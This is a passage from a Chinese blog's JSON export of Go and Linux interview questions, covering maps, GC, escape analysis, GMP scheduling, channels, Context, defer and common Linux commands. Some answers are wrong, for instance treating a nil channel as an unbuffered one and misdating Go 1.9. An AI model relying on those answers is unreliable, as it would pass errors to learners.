内核进行调度）。\n协程拥有自己的寄存器上下文和栈。协程调度切换时，将寄存器上下文和栈保存到其他地方，在切回来的时候，恢复先前保存的寄存器上下文和栈，直接操作栈则基本没有内核切换的开销，可以不加锁的访问全局变量，所以上下文的切换非常快。\n对于进程、线程，都是有内核进行调度，有 CPU 时间片的概念，进行抢占式调度（有多种调度算法）。而对于协程(用户级线程)，这是对内核透明的，也就是系统并不知道有协程的存在，是完全由用户自己的程序进行调度的，因为是由用户程序自己控制，那么就很难像抢占式调度那样做到强制的 CPU 控制权切换到其他进程/线程，通常只能进行协作式调度，需要协程自己主动把控制权转让出去之后，其他协程才能被执行到。\ngoroutine和协程区别:本质上，goroutine 就是协程。不同的是，Golang 在 runtime、系统调用等多方面对 goroutine 调度进行了封装和处理，当遇到长时间执行或者进行系统调用时，会主动把当前 goroutine 的CPU § 转让出去，让其他 goroutine 能被调度并执行，也就是 Golang 从语言层面支持了协程。Golang 的一大特色就是从语言层面原生支持协程，在函数或者方法前面加 go关键字就可创建一个协程。\n讲一下set的原理，Java 的HashMap和 go 的map底层原理1. Set原理:Set特性: 1. 不包含重复key. 2.无序.如何去重:通过查看源码add(E e)方法，底层实现有一个map，map是HashMap,Hash类型是散列，所以是无序的.如果key值相同，将会覆盖，这就是set为什么能去重的原因(key相同会覆盖).注意:如果new出两个对象add到set中,因为两个对象的地址不相同,所以map在计算key的hash值时，将它当成了两个不同的元素。这时要重写equals和hashcode两个方法。这样才能保证set集合的元素不重复.\n2. Java HashMap:\n线程不安全 安全的map(CurrentHashMap)HashMap由数组+链表组成,数组是HashMap的主体,链表则是为了解决哈希冲突而存在的,如果定位到的数组位置不含链表（当前entry的next指向null）,那么查找，添加等操作很快，仅需一次寻址即可；如果定位到的数组包含链表，对于添加操作，其时间复杂度为O(n)，首先遍历链表，存在即覆盖，否则新增；对于查找操作来讲，仍需遍历链表，然后通过key对象的equals方法逐一比对查找。所以，性能考虑，HashMap中的链表出现越少，性能才会越好。假如一个数组槽位上链上数据过多（即链表过长的情况）导致性能下降该怎么办？JDK1.8在JDK1.7的基础上针对增加了红黑树来进行优化。即当链表超过8时，链表就转换为红黑树，利用红黑树快速增删改查的特点提高HashMap的性能，其中会用到红黑树的插入、删除、查找等算法。\n3. go map:\n线程不安全 安全的map(sync.map)特性: 1. 无序. 2. 长度不固定. 3. 引用类型.底层实现:1.hmap 2.bmap(bucket)hmap中含有n个bmap，是一个数组.每个bucket又以链表的形式向下连接新的bucket.bucket关注三个字段: 1. 高位哈希值 2. 存储key和value的数组 3. 指向扩容bucket的指针高位哈希值: 用于寻找bucket中的哪个key.低位哈希值: 用于寻找当前key属于hmap中的哪个bucket.map的扩容:当map中的元素增长的时候，Go语言会将bucket数组的数量扩充一倍，产生一个新的bucket数组，并将旧数组的数据迁移至新数组。加载因子判断扩充的条件，就是哈希表中的加载因子(即loadFactor)。加载因子是一个阈值，一般表示为：散列包含的元素数 除以 位置总数。是一种”产生冲突机会”和”空间使用”的平衡与折中：加载因子越小，说明空间空置率高，空间使用率小，但是加载因子越大，说明空间利用率上去了，但是”产生冲突机会”高了。每种哈希表的都会有一个加载因子，数值超过加载因子就会为哈希表扩容。Golang的map的加载因子的公式是：map长度 / 2^B(这是代表bmap数组的长度，B是取的低位的位数)阈值是6.5。其中B可以理解为已扩容的次数。当Go的map长度增长到大于加载因子所需的map长度时，Go语言就会将产生一个新的bucket数组，然后把旧的bucket数组移到一个属性字段oldbucket中。注意：并不是立刻把旧的数组中的元素转义到新的bucket当中，而是，只有当访问到具体的某个bucket的时候，会把bucket中的数据转移到新的bucket中。map删除:并不会直接删除旧的bucket，而是把原来的引用去掉，利用GC清除内存。\n⭐go的GC（标记清理 -&gt; 三色标记发 -&gt; 混合写屏障）\n标记清除:此算法主要有两个主要的步骤：\n标记(Mark phase)\n清除(Sweep phase)\n第一步，找出不可达的对象，然后做上标记。第二步，回收标记好的对象。\n操作非常简单，但是有一点需要额外注意：mark and sweep算法在执行的时候，需要程序暂停！即 stop the world。也就是说，这段时间程序会卡在哪儿。故中文翻译成 卡顿.\n标记-清扫(Mark And Sweep)算法存在什么问题？标记-清扫(Mark And Sweep)算法这种算法虽然非常的简单，但是还存在一些问题：\nSTW，stop the world；让程序暂停，程序出现卡顿。\n标记需要扫描整个heap\n清除数据会产生heap碎片这里面最重要的问题就是：mark-and-sweep 算法会暂停整个程序。\n\n三色并发标记法:首先：程序创建的对象都标记为白色。gc开始：扫描所有可到达的对象，标记为灰色从灰色对象中找到其引用对象标记为灰色，把灰色对象本身标记为黑色监视对象中的内存修改，并持续上一步的操作，直到灰色标记的对象不存在此时，gc回收白色对象最后，将所有黑色对象变为白色，并重复以上所有过程。\n\n混合写屏障:注意：当gc进行中时，新创建一个对象. 按照三色标记法的步骤,对象会被标记为白色,这样新生成的对象最后会被清除掉，这样会影响程序逻辑.golang引入写屏障机制.可以监控对象的内存修改，并对对象进行重新标记.gc一旦开始，无论是创建对象还是对象的引用改变，都会先变为灰色。\n\n\ngo 中用 for 遍历多次执行 goroutine会存在什么问题goroutine并非按照for循环的顺序执行协程函数的，因为初始化协程也是消耗资源的，所以go的协程是并发执行的，且for循环的索引，是goroutine准备好再取读取对应的值，所以可能出现多个goroutine获取到的入参都是同一个值。\n⭐gmp当一个g堵塞时，g、m、p会发生什么当g阻塞时，p会和m解绑，去寻找下一个可用的m。g&amp;m在阻塞结束之后会优先寻找之前的p，如果此时p已绑定其他m，当前m会进入休眠，g以可运行的状态进入全局队列。\n⭐（🐮啊，胖🐯）Golang 逃逸分析面试官：”写过C/C++的同学都知道，调用著名的malloc和new函数可以在堆上分配一块内存，这块内存的使用和销毁的责任都在程序员。一不小心，就会发生内存泄露。那你说下Golang 是怎么处理这个问题的”\n胖虎：”Golang 通过逃逸分析，对内存管理进行的优化和简化，它可以决定一个变量是分配到堆还栈上。”\n什么是golang的逃逸分析\n面试官：”那你说下什么是逃逸分析吧”\n胖虎想：”这道题我会啊，准备好了吗，我要开始装X了。”\nGolang 的逃逸分析，是指编译器根据代码的特征和生命周期，自动的把变量分配到堆或者是栈上面。\n通过优化了内存管理机制，解放广大程序员的双手。让程序员更关注于业务。\n注意：Go 在编译阶段确立逃逸，并不是在运行时。\n什么是栈与堆\n面试官：”那你说下什么是栈和堆”\n胖虎心：”这个也简单啊”\n栈（ stack）是系统自动分配空间的，例如我们定义一个 char a；系统会自动在栈上为其开辟空间。而堆（heap）则是程序员根据需要自己申请的空间，例如 malloc（10）；开辟十个字节的空间。\n先看下内存分配图\n\n栈在内存中是从高地址向下分配的，并且连续的，遵循先进后出原则。系统在分配的时候已经确定好了栈的大小空间。栈上面的空间是自动回收的，所以栈上面的数据的生命周期在函数结束后，就被释放掉了。\n堆分配是从低地址向高地址分配的，每次分配的内存大小可能不一致，导致了空间是不连续的，这也产生内存碎片的原因。由于是程序分配，所以效率相对慢些。而堆上的数据只要程序员不释放空间，就一直可以访问到，不过缺点是一旦忘记释放会造成内存泄露。\n\n逃逸分析有什么好处\n面试官：”那你说下逃逸分析有什么好处吗”\n胖虎：”你是十万个为什么吗？”， 但胖虎还是掏出了自己的看家本领。\n就像刚开始提到的，Go 语言中内存的分配不是有程序员自己决定的，而是通过编译阶段确定的分配到何处。这样有什么好处呢？没错机智的你，可能已经猜到了就是为了优化程序，榨干机器性能，让内存能够得到更高的使用效率。\n通过逃逸分析，那些不需要分配到堆上的变量直接分配到栈上，堆上的变量少了不但同时减少 GC 的压力，还减轻了内存分配的开销。\n常见的逃逸现象\n面试官点点头，称赞的眼光看着胖虎说：”那你在说说，常见的逃逸现象有哪些吧”\n胖虎内心崩溃了：”就我一个人一直在这说，都要渴死了，倒是给我来杯水啊，能不能让我喘口气”。但一想 JD 上面给的薪资还是挺诱惑人的，那就在回答一题。\nfunc（函数类型）数据类型\npackage mainimport &quot;fmt&quot;func main() &#123;    name := test()    fmt.Println(name())&#125;func test() func() string &#123;    return func() string &#123;        return &quot;后端时光&quot;    &#125;&#125;\n\n执行命令\ngo build -gcflags=&quot;-m -l&quot; eee.go\n\n-m：表示内存分析 -l：表示防止内联优化\n结果如下，第11行变量 name 逃逸到了堆上\n\ninterface{} 数据类型\npackage mainimport &quot;fmt&quot;func main() &#123;    name := &quot;Golang&quot;    fmt.Println(name)&#125;\n\n同理执行逃逸分析，结果如下， name 变量也逃逸到堆上了\n\n原因是 go/src/fmt/print.go 文件中 Println 传参数类型 interface{}, 编译器对传入的变量类型未知，所有统一处理分配到了堆上面去了。\n\n指针类型\npackage mainimport &quot;fmt&quot;func main() &#123;    name := point()    fmt.Println(*name)&#125;func point() *string &#123;    name := &quot;指针&quot;    return &amp;name&#125;\n\n结果如下，第11行变量 name 逃逸到了堆上\n\n还有其他情况出现变量逃逸吗？\n“额，这……”，胖虎心想：时间太匆忙了，八股文我就背了这么点啊，其他的还么来得及看呢，要是昨天少玩一把游戏就好了。这可怎么办？\n看着胖虎憋的满脸通红，面试官笑呵呵的说，”没事的，时间也不早了，今天先到这吧，你还有什么要问我的吗？”\n胖虎：”还有哪些会出现变量逃逸啊”\n面试官：”channel 或者栈空间不足逃逸, 也会导致逃逸的情况”\n原文出处\nhttps://mp.weixin.qq.com/s/JXLGLya8ryCMS3g6loTZHw\n获取不到锁会一直等待吗？会。在 2016 年 Go 1.9 中 Mutex 增加了饥饿模式，让锁变得更公平，不公平的等待时间限制在 1 毫秒，并且修复了一个大 Bug：总是把唤醒的 goroutine 放在等待队列的尾部，会导致出现不公平的等待时间。那什么时候会进入饥饿模式？1 毫秒，一旦等待者等待时间超过这个时间阈值，就可能会进入饥饿模式，优先让等待着先获取到锁。有饥饿模式自然就有正常模式了，这里就不展开了。你只需要记住，Mutex 锁不会容忍一个 goroutine 被落下，永远没有机会获取锁。Mutex 尽可能地让等待较长的 goroutine 更有机会获取到锁。\n如何实现一个 timeout 的锁？用 for 循环和 TryLock 实现。先记录开始的时间，用 for 循环判断是否超时，没有超时则反复尝试 TryLock，直到获取成功；如果超时直接返回失败。可这样有一个问题，高频的 CAS 自旋操作，如果失败的太多，会消耗大量的 CPU，我们需要进行优化，将 TryLock 的抢占实现分为两部分，一个是 fast path，另一个是竞争状态下的，后者的 CAS 操作很多，可以考虑减少 slow 方法的频率，例如调用 n 次 fast path 失败后，再调用一次整个 TryLock。我们还可以借鉴 TCP 重试机制进行优化，for 循环中的重试增加休眠时间，每次失败将休眠时间乘以一个系数，直到达到上限，减少自旋带来的性能损耗。\ngo 的切片扩容机制1.18之前都是在1024之前翻倍扩容，之后是1.25倍1.18之后在256之后，（1.25倍+192），小切片比较多，减少内存分配次数\n管道是否能二次关闭？关闭已关闭的通道\n会引发panic: close of closed channel\n//关闭一个已经关闭的管道func main() &#123;    channel := make(chan int, 10)    close(channel)    close(channel)&#125;/*[Output]: panic: close of closed channel */\n\n管道关闭是否能读写？\n往已关闭的channel写入会引发panic；\n读已关闭的channel能一直读到东西，但是读到的内容根据通道内关闭前是否有元素而不同。\n\n\n如果chan关闭前，buffer内有元素还未读,会正确读到chan内的值，且返回的第二个bool值（是否读成功）为true。\n如果chan关闭前，buffer内有元素已经被读完，chan内无值，接下来所有接收的值都会非阻塞直接成功，返回 channel 元素的零 值，但是第二个bool值一直为false。\n\n问等待所有goroutine结束，怎么做？用channel进行同步(该方法需要知道goroutine的数量)func main() &#123;    ch := make(chan int, 2)    go func() &#123;        for i := 0; i &lt; 10; i++ &#123;            time.Sleep(1 * time.Second)            fmt.Println(&quot;go routine1&quot;, i)        &#125;        ch &lt;- 1    &#125;()    go func() &#123;        for i := 0; i &lt; 10; i++ &#123;            time.Sleep(1 * time.Second)            fmt.Println(&quot;go routine2&quot;, i)        &#125;        ch &lt;- 2    &#125;()    // 等待    for i := 0; i &lt; 2; i++ &#123;        &lt;-ch    &#125;    fmt.Println(&quot;main exist&quot;)&#125;\n\n用sync.WaitGrouppackage mainimport &quot;fmt&quot;import &quot;time&quot;import &quot;sync&quot;func main() &#123;    var wg sync.WaitGroup    for i := 0; i &lt; 10; i++ &#123;        wg.Add(1)        go func(i int) &#123;            defer wg.Done()            time.Sleep(1 * time.Second)            fmt.Println(i)        &#125;(i)    &#125;    wg.Wait() // 等待    fmt.Println(&quot;main exist&quot;)&#125;\n","categories":["Golang","面试题","垃圾回收","GMP模型","内存管理"],"tags":["Golang","Go面试题","Channel","Mutex","Map","GMP","Goroutine","GC","三色标记法","混合写屏障","逃逸分析","WaitGroup"]},{"title":"Golang面试题详解（十）：并发模型、GMP调度、Context与defer","url":"/posts/52804.html","content":"Golang题库（十）空结构体占不占内存空间？ 为什么使用空结构体？空结构体是没有内存大小的结构体。通过 unsafe.Sizeof() 可以查看空结构体的宽度，代码如下：\nvar s struct&#123;&#125;fmt.Println(unsafe.Sizeof(s)) // prints 0\n\n准确的来说，空结构体有一个特殊起点： zerobase 变量。zerobase是一个占用 8 个字节的uintptr全局变量。每次定义 struct &#123;&#125; 类型的变量，编译器只是把zerobase变量的地址给出去。也就是说空结构体的变量的内存地址都是一样的。\n空结构体的使用场景主要有三种：\n实现方法接收者：在业务场景下，我们需要将方法组合起来，代表其是一个 “分组” 的，便于后续拓展和维护。\n实现集合类型：在 Go 语言的标准库中并没有提供集合（Set）的相关实现，因此一般在代码中我们图方便，会直接用 map 来替代：type Set map[string]struct&#123;&#125;。\n实现空通道：在 Go channel 的使用场景中，常常会遇到通知型 channel，其不需要发送任何数据，只是用于协调 Goroutine 的运行，用于流转各类状态或是控制并发情况。\n\nKratos 框架的特性Kratos 是一套轻量级的微服务框架，包含了大量微服务相关框架以及工具，它就像一个工具箱，目前已加入 CNCF 协会进行孵化。Kratos 框架最重要的特性就是可插拔，它并没有像字节的 go 微服务框架一样打造一套属于自己的生态，而是选择依赖开源社区的明星项目，将它们灵活的集成到 Kratos 中。\ndefer 是怎么用的从 defer 关键字的常见使用场景和使用时需要注意什么来回答这个问题（不深入到实现原理）defer 最常见的使用场景就是在函数调用结束后，完成一些收尾工作，例如在 defer 中回滚数据库的事务。在 go 语言中使用 defer 常会遇到的两个问题，首先是 defer 关键字的调用时机， defer 被多次调用时的执行顺序，其次是 defer 使用传值的方式传递参数时会进行预计算，会导致结果不符合预期。调用时机与作用域有关，预计算参数与预期不符与 defer 关键字的复制操作有关。\nContext 包的作用Context 就像糖葫芦中的竹签子它的作用是在上下文中传递除了业务参数之外的额外信息，这个额外信息是为了全局而考虑使用的，例如在微服务业务中，我们需要整个业务链条整体的超时时间信息。不过 go 标准库中的 Context 还提供了超时 Timeout 和 Cancel 机制。总的来说，在下面这些场景中，可以考虑使用 Context：\n\n上下文信息传递\n控制子 goroutine 的运行\n超时控制的方法调用\n可以取消的方法调用\n\ngolang并发模型参考文章\ngolang控制并发有三种经典的方式,一种是通过channel通知实现并发控制 一种是WaitGroup,另外一种就是Context。\n\n使用最基本通过channel通知实现并发控制无缓冲通道:无缓冲的通道指的是通道的大小为0，也就是说，这种类型的通道在接收前没有能力保存任何值，它要求发送 goroutine 和接收 goroutine 同时准备好，才可以完成发送和接收操作。从上面无缓冲的通道定义来看，发送 goroutine 和接收 gouroutine 必须是同步的，同时准备后，如果没有同时准备好的话，先执行的操作就会阻塞等待，直到另一个相对应的操作准备好为止。这种无缓冲的通道我们也称之为同步通道。例子:\nfunc main() &#123;    ch := make(chan struct&#123;&#125;)    go func() &#123;        ch &lt;- struct&#123;&#125;&#123;&#125;    &#125;()    fmt.Println(&lt;-ch)&#125;\n\n解释当主 goroutine 运行到 &lt;-ch 接受 channel 的值的时候，如果该 channel 中没有数据，就会一直阻塞等待，直到有值。 这样就可以简单实现并发控制。\n\n通过sync包中的WaitGroup实现并发控制在 sync 包中，提供了 WaitGroup ，它会等待它收集的所有 goroutine 任务全部完成，在主 goroutine 中 Add(delta int) 索要等待goroutine 的数量。在每一个 goroutine 完成后 Done() 表示这一个goroutine 已经完成，当所有的 goroutine 都完成后，在主 goroutine 中 WaitGroup 返回返回。\n例子：\nfun main()&#123;    var wg sync.WaitGroup    var urls = []string&#123;        &quot;http://www.golang.org/&quot;,        &quot;http://www.sensetime.com/&quot;,        &quot;http://www.baidu.com/&quot;,    &#125;    for _, url := range urls &#123;        wg.Add(1)        go func(url string) &#123;            defer wg.Done()            http.Get(url)        &#125;(url)    &#125;    wg.Wait()&#125;\n在Go 1.7 以后引进的强大的Context上下文，实现并发控制在一些简单场景下使用 channel 和 WaitGroup 已经足够了，但是当面临一些复杂多变的网络并发场景下 channel 和 WaitGroup 显得有些力不从心了。比如一个网络请求 Request，每个 Request 都需要开启一个 goroutine 做一些事情，这些 goroutine 又可能会开启其他的 goroutine，比如数据库和RPC服务。所以我们需要一种可以跟踪 goroutine 的方案，才可以达到控制他们的目的，这就是Go语言为我们提供的 Context，称之为上下文非常贴切，它就是goroutine 的上下文。它是包括一个程序的运行环境、现场和快照等。每个程序要运行时，都需要知道当前程序的运行状态，通常Go 将这些封装在一个 Context 里，再将它传给要执行的 goroutine 。context 包主要是用来处理多个 goroutine 之间共享数据，及多个 goroutine 的管理。context包方法:Done() 返回一个只能接受数据的channel类型，当该context关闭或者超时时间到了的时候，该channel就会有一个取消信号Err() 在Done() 之后，返回context 取消的原因。Deadline() 设置该context cancel的时间点Value() 方法允许 Context 对象携带request作用域的数据，该数据必须是线程安全的。例子:\nfunc childFunc(cont context.Context, num *int) &#123;    ctx, _ := context.WithCancel(cont)    for &#123;        select &#123;        case &lt;-ctx.Done():            fmt.Println(&quot;child Done : &quot;, ctx.Err())            return        &#125;    &#125;&#125;func main() &#123;    gen := func(ctx context.Context) &lt;-chan int &#123;        dst := make(chan int)        n := 1        go func() &#123;            for &#123;                select &#123;                case &lt;-ctx.Done():                    fmt.Println(&quot;parent Done : &quot;, ctx.Err())                    return // returning not to leak the goroutine                case dst &lt;- n:                    n++                    go childFunc(ctx, &amp;n)                &#125;            &#125;        &#125;()        return dst    &#125;    ctx, cancel := context.WithCancel(context.Background())    for n := range gen(ctx) &#123;        fmt.Println(n)        if n &gt;= 5 &#123;            break        &#125;    &#125;    cancel()    time.Sleep(5 * time.Second)&#125;\n\n在上面的例子中，主要描述的是通过一个channel实现一个为循环次数为5的循环，在每一个循环中产生一个goroutine，每一个goroutine中都传入context，在每个goroutine中通过传入ctx创建一个子Context,并且通过select一直监控该Context的运行情况，当在父Context退出的时候，代码中并没有明显调用子Context的Cancel函数，但是分析结果，子Context还是被正确合理的关闭了，这是因为，所有基于这个Context或者衍生的子Context都会收到通知，这时就可以进行清理操作了，最终释放goroutine，这就优雅的解决了goroutine启动后不可控的问题。\n\n\n⭐golang gmp模型，全局队列中的G会不会饥饿,为什么？P的数量是多少？能修改吗？M的数量是多少？全局队列中的G不会饥饿，P中每执行61次调度，就需要优先从全局队列中获取一个G到当前P中，并执行下一个要执行的G。\n调度协程的优先级与顺序：\nP，可以通过 runtime.GOMAXPROCS() 设置数量，默认为当前CP\nM数量问题Go语⾔本身是限定M的最⼤量是10000。runtime/debug包中的SetMaxThreads函数来设置。有⼀个M阻塞，会创建⼀个新的M。如果有M空闲，那么就会回收或者睡眠。\ngo 语言的 panic 如何恢复recover()recover和panic必须在同一个goroutine中recover必须放到延迟执行函数defer中\ndefer 的执行顺序在同一个函数中，defer 函数调用的执行顺序与它们分别所属的 defer 语句的出现顺序完全相反。当一个函数即将结束执行时，写在最下面的 defer 函数调用会最先执行，其次是写在他上边，与它的距离最近的那个 defer 函数调用，以此类推，最上面的 defer 函数调用会最后一个执行。需要注意一下 for 循环中的 defer 执行顺序。如果函数中有一条 for 循环语句，并且这个 for 循环语句中包含了一条 defer 语句，那么 defer 语句的执行是怎样的？弄清楚这个问题需要弄明白 defer 语句执行时发生的事情。在 defer 语句每次执行的时候，go 语言会把它携带的 defer 函数及其参数值存储到一个链表中，这个链表叫做 goroutine_defer。这个链表与 defer 语句所属的函数是对应的，它是先进先出的，相当于一个栈。在执行某个函数中的 defer 函数调用的时候，go 语言会先拿到对应的链表，然后从链表中一个一个取出 defer 函数及其参数值，逐个调用，这也就是为什么说 “defer 函数调用的执行顺序与它们分别所属的 defer 语句的出现顺序完全相反”。\n服务器能开多少个M由什么决定\n由于M必须持有一个P才可以运行Go代码，所以同时运行的M个数，也即线程数一般等同于CPU的个数，以达到尽可能的使用CPU而又不至于产生过多的线程切换开销。\nP的个数默认等于CPU核数，每个M必须持有一个P才可以执行G，一般情况下M的个数会略大于P的个数，这多出来的M将会在G产生系统调用时发挥作用。\nGo语⾔本身是限定M的最⼤量是10000，可以在runtime/debug包中的SetMaxThreads函数来修改设置\n\n服务器能开多少个P由什么决定\nP的个数在程序启动时决定，默认情况下等同于CPU的核数\n程序中可以使用 runtime.GOMAXPROCS() 设置P的个数，在某些IO密集型的场景下可以在一定程度上提高性能。\n一般来讲，程序运行时就将GOMAXPROCS大小设置为CPU核数，可让Go程序充分利用CPU。在某些IO密集型的应用里，这个值可能并不意味着性能最好。理论上当某个Goroutine进入系统调用时，会有一个新的M被启用或创建，继续占满CPU。但由于Go调度器检测到M被阻塞是有一定延迟的，也即旧的M被阻塞和新的M得到运行之间是有一定间隔的，所以在IO密集型应用中不妨把GOMAXPROCS设置的大一些，或许会有好的效果。\n\nM和P是怎么样的关系M必须拥有P才可以执行G中的代码，理想情况下一个M对应一个P，P含有包含多个G的队列，P会周期性地将G调度到M种执行。\n同时启动了一万个G，如何调度？首先一万个G会按照P的设定个数，尽量平均地分配到每个P的本地队列中。如果所有本地队列都满了，那么剩余的G则会分配到GMP的全局队列上。接下来便开始执行GMP模型的调度策略：\n\n本地队列轮转：每个P维护着一个包含G的队列，不考虑G进入系统调用或IO操作的情况下，P周期性的将G调度到M中执行，执行一小段时间，将上下文保存下来，然后将G放到队列尾部，然后从队首中重新取出一个G进行调度。\n系统调用：上面说到P的个数默认等于CPU核数，每个M必须持有一个P才可以执行G，一般情况下M的个数会略大于P的个数，这多出来的M将会在G产生系统调用时发挥作用。当该G即将进入系统调用时，对应的M由于陷入系统调用而进被阻塞，将释放P，进而某个空闲的M1获取P，继续执行P队列中剩下的G。\n工作量窃取：多个P中维护的G队列有可能是不均衡的，当某个P已经将G全部执行完，然后去查询全局队列，全局队列中也没有新的G，而另一个M中队列中还有3很多G待运行。此时，空闲的P会将其他P中的G偷取一部分过来，一般每次偷取一半。\n\ngo的init函数是什么时候执行的？\ninit函数的主要作用：1）初始化不能采用初始化表达式初始化的变量。2）程序运行前的注册。3）实现sync.Once功能。4）其他\ninit函数的主要特点：1）init函数先于main函数自动执行，不能被其他函数调用；2）init函数没有输入参数、返回值；3）每个包可以有多个init函数；4）包的每个源文件也可以有多个init函数，这点比较特殊；5）同一个包的init执行顺序，golang没有明确定义，编程时要注意程序不要依赖这个执行顺序。6）不同包的init函数按照包导入的依赖关系决定执行顺序。\ngolang程序初始化golang程序初始化先于main函数执行，由runtime进行初始化，初始化顺序如下：1）初始化导入的包（包的初始化顺序并不是按导入顺序（”从上到下”）执行的，runtime需要解析包依赖关系，没有依赖的包最先初始化，与变量初始化依赖关系类似，参见golang变量的初始化）；2）初始化包作用域的变量（该作用域的变量的初始化也并非按照”从上到下、从左到右”的顺序，runtime解析变量依赖关系，没有依赖的变量最先初始化，参见golang变量的初始化）；3）执行包的init函数；\n\n故，最终初始化顺序:变量初始化 -&gt; init() -&gt; main()\n","categories":["Golang","面试题","并发编程","GMP模型"],"tags":["Golang","Go面试题","Channel","GMP","WaitGroup","并发模型","Context","defer","panic","recover","init","空结构体"]},{"title":"Golang面试题详解（四）：Map、Channel、WaitGroup常见陷阱及Struct比较","url":"/posts/5389.html","content":"Golang题库（四）map取一个key，然后修改这个值，原map数据的值会不会变化？map属于引用类型，所以取一个key，然后修改这个值，原map数据的值会发生变化\n向为nil的channel发送数据会怎么样空通道即无缓冲通道。无缓冲通道上的发送操作将会阻塞，直到另一个goroutine在对应的通道上执行接收操作，这时值传送完成，两个goroutine都可以继续执行。相反，如果接收操作先执行，接收方gorountine将阻塞，直到另一个goroutine在同一个通道上发送一个值。\n使用无缓冲通道进行的通信导致发送和接收goroutine同步化。因此，无缓冲通道也称为同步通道。当一个值在无缓冲通道上传递时，接收值后发送方goroutine才被再次唤醒。\nWaitGroup的坑\nAdd一个负数如果计数器的值小于0会直接panic\n\nAdd在Wait之后调用比如一些子协程开头调用Add结束调用Wait，这些 Wait无法阻塞子协程。正确做法是在开启子协程之前先Add特定的值。\n\n未置为0就重用WaitGroup可以完成一次编排任务，计数值降为0后可以继续被其他任务所用，但是不要在还没使用完的时候就用于其他任务，这样由于带着计数值，很可能出问题。\n\n复制waitgroupWaitGroup有nocopy字段，不能被复制。也意味着WaitGroup不能作为函数的参数。\n\n\ngo struct 能不能比较需要具体情况具体分析，如果struct中含有不能被比较的字段类型，就不能被比较，如果struct中所有的字段类型都支持比较，那么就可以被比较。\n不可被比较的类型:① slice，因为slice是引用类型，除非是和nil比较② map，和slice同理，如果要比较两个map只能通过循环遍历实现③ 函数类型\n其他的类型都可以比较。\n还有两点值得注意：\n\n结构体之间只能比较它们是否相等，而不能比较它们的大小。\n只有所有属性都相等而属性顺序都一致的结构体才能进行比较。\n\n","categories":["Golang","面试题","并发编程"],"tags":["Golang","Go面试题","Channel","Map","WaitGroup","Struct","并发陷阱"]},{"title":"Linux面试题（一）：常用命令、体系结构与内核空间","url":"/posts/52412.html","content":"操作系统题库（一）1.Linux常用命令作答：\ncd ls top free df du awk sed vi zip/unzip tar gzip cp mv rm grep cat echo export ssh\n\n这些都是我比较常用的命令。\n参考答案：\n常用命令\n\n目录相关\nfind 命令\nls 命令\npwd 命令\ncd 命令\n\n\nmkdir 命令\ndf 命令\nrm 命令\nmv 命令\ncp 命令\nmount 命令\ncat 命令\ntail 命令\nless 命令\n\n\n通用命令\ngrep 命令\nsed 命令\nawk 命令\nvim 命令\ndiff 命令\nsort 命令\nxargs 命令\n\n\n压缩相关\ntar 命令\ngzip 命令\nbzip2 命令\nunzip 命令\n\n\n系统命令\nexport 命令\nkill 命令\npasswd 命令\nsu 命令\nyum 命令\nrpm 命令\nshutdown 命令\ncrontab 命令\nservice 命令\nchmod 命令\nchown 命令\nuname 命令\nwhereis 命令\nlocate 命令\nman 命令\n\n\n网络相关\nifconfig 命令\nping 命令\ncurl 命令\nwget 命令\nftp 命令\nssh 命令\nps 命令\nuptime 命令\ndmesg 命令\nvmstat 命令\nmpstat 命令\npidstat 命令\niostat 命令\nfree 命令\nsar 命令\ntop 命令\nnetstat 命令\n\n\n\n2.Linux体系结构作答：\n参考答案：\n从大的方面讲，Linux 体系结构可以分为两块：Linux 体系结构\n\n用户空间(User Space) ：用户空间又包括用户的应用程序(User Applications)、C 库(C Library) 。\n内核空间(Kernel Space) ：内核空间又包括系统调用接口(System Call Interface)、内核(Kernel)、平台架构相关的代码(Architecture-Dependent Kernel Code) 。\n\n3.为什么 Linux 体系结构要分为用户空间和内核空间的原因？作答：\n参考答案：\n\n现代 CPU 实现了不同的工作模式，不同模式下 CPU 可以执行的指令和访问的寄存器不同。\nLinux 从 CPU 的角度出发，为了保护内核的安全，把系统分成了两部分。\n\n用户空间和内核空间是程序执行的两种不同的状态，我们可以通过两种方式完成用户空间到内核空间的转移：\n\n系统{调用；\n硬件中断。\n\n","categories":["Linux","面试题","操作系统"],"tags":["Linux","操作系统","常用命令","Linux命令","体系结构","用户空间","内核空间","Linux面试题"]},{"title":"Linux面试题详解（三）：性能、Shell、网络与安全","url":"/posts/20671.html","content":"操作系统题库（三）16.如何选择 Linux 操作系统版本？作答\n优先选择熟悉的操作系统，然后选择仍然在官方支持的版本。优先选择熟悉的系统可以更好更快的开发业务，选择官方支持的版本能够保持软件源的更新和及时同步安全补丁，同时有更好的社区支持。\n按我来说就是CentOS 7。\n答案\n一般来讲，桌面用户首选 Ubuntu ；服务器首选 RHEL 或 CentOS ，两者中首选 CentOS 。\n根据具体要求：\n\n安全性要求较高，则选择 Debian 或者 FreeBSD 。\n需要使用数据库高级服务和电子邮件网络应用的用户可以选择 SUSE 。\n想要新技术新功能可以选择 Feddora ，Feddora 是 RHEL 和 CentOS 的一个测试版和预发布版本。\n【重点】根据现有状况，绝大多数互联网公司选择 CentOS 。现在比较常用的是 7 系列，现在市场占有大概一半左右。另外的原因是 CentOS 更侧重服务器领域，并且无版权约束。\n\n17. 如何规划一台 Linux 主机，步骤是怎样？作答\n1、确定机器是做什么用的，比如是做 WEB 、DB、还是游戏服务器。\n\n不同的用途，机器的配置会有所不同。\n\n\n2、确定好之后，就要定系统需要怎么安装，默认安装哪些系统、分区怎么做。\n3、需要优化系统的哪些参数，需要创建哪些用户等等的。\n\n答案\n1、确定机器是做什么用的，比如是做 WEB 